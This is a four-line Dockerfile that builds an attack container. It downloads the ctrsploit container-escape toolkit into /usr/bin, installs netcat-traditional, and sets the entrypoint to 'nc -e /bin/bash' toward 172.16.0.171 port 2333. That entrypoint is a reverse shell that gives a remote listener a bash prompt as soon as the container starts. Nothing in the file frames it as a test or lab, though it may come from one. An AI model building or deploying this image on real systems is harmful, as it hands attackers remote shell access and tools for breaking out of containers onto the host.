FROM ubuntu
ADD --chmod=755 https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 /usr/bin/ctrsploit
RUN apt-get update && apt-get install netcat-traditional
ENTRYPOINT ["nc", "-e", "/bin/bash", "172.16.0.171", "2333"]